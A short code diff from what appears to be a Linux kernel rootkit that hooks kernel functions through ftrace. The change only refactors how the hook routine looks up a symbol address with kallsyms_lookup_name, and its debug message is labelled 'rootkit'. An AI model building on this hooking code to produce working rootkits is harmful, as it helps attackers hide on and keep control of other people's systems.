@@ -54,12 +54,11 @@ struct ftrace_hook {
  * */
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
 {
-    char *hook_name = (hook->name);
-    hook->address = kallsyms_lookup_name(hook_name);
+    hook->address = kallsyms_lookup_name(hook->name);
 
     if (!hook->address)
     {
-        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook_name);
+        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
         return -ENOENT;
     }
 
